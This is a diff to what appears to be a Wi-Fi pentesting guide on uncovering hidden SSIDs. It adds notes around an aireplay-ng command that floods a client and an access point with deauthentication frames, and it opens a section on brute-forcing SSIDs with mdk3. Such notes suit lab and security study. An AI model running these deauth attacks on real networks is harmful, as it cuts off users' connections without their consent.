@@ -41,10 +41,11 @@ Run airodump live to see ESSID update:
 ```
 airodump-ng wlan1mon --band agp
 ```
-Deauth target client MAC (`-c`) with AP MAC (`-a`)  (both found in dump):
+On a second terminal, deauth target client MAC (`-c`) with AP MAC (`-a`)  (both found in dump):
 ```
 aireplay-ng -0 100 -a B2:C1:3D:3B:2B:A1 -c 02:00:00:00:02:00 wlan1mon
 ```
+Watch live dump to see updated ESSID
 
 ## Brute forcing hidden SSID
 With `mdk3`, we can either provide a wordlist or specify the length of the SSID so the tool can automatically generate potential SSID names:
